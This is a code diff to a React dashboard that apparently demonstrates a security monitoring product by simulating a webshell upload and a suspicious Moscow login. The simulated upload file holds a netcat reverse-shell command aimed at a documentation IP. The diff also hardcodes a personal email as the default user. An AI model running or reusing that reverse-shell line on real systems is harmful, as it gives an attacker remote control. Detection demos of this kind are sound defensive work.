@@ -177,10 +177,13 @@ export const PortalDashboard = () => {
     const blob = new Blob(["#!/bin/bash\n# Malicious Remote Shell Execution\nnc -e /bin/bash 198.51.100.222 4444\neval('malware_code')"], { type: 'text/plain' });
     const maliciousFile = new File([blob], 'malicious_webshell.sh', { type: 'text/plain' });
 
+    const activeUsername = user?.username || 'Sourabh_4';
+    const activeEmail = user?.email || 'sourabhchoudhari0123@gmail.com';
+
     const formData = new FormData();
     formData.append('file', maliciousFile);
-    formData.append('user_id', user?.username || 'Sourabh_4');
-    formData.append('user_email', user?.email || 'sourabh@sentinelai.com');
+    formData.append('user_id', activeUsername);
+    formData.append('user_email', activeEmail);
     formData.append('source_ip', '198.51.100.222');
 
     pushSecurityWarningNotification('malicious_webshell.sh');
@@ -197,10 +200,13 @@ export const PortalDashboard = () => {
   };
 
   const handleSimulateUBAAttack = async () => {
+    const activeUsername = user?.username || 'Sourabh_4';
+    const activeEmail = user?.email || 'sourabhchoudhari0123@gmail.com';
+
     setNotifications(prev => [
       {
         id: Date.now(),
-        title: '⚠️ SECURITY WARNING: Anomaloous Geographic Login Shift',
+        title: '⚠️ SECURITY WARNING: Anomalous Geographic Login Shift',
         desc: `Unverified login session detected from Moscow, Russia (198.51.100.222). Do not attempt unapproved remote proxy logins; otherwise account access will be terminated.`,
         time: 'Just Now',
         type: 'warning'
@@ -212,8 +218,8 @@ export const PortalDashboard = () => {
       await logPortalActivity({
         event_name: 'ANOMALOUS_GEOGRAPHIC_SHIFT_LOGIN',
         source_ip: '198.51.100.222',
-        user_id: user?.username || 'Sourabh_4',
-        user_email: user?.email || 'sourabh@sentinelai.com',
+        user_id: activeUsername,
+        user_email: activeEmail,
         country: 'Russia',
         city: 'Moscow',
         device: 'Linux Workstation'
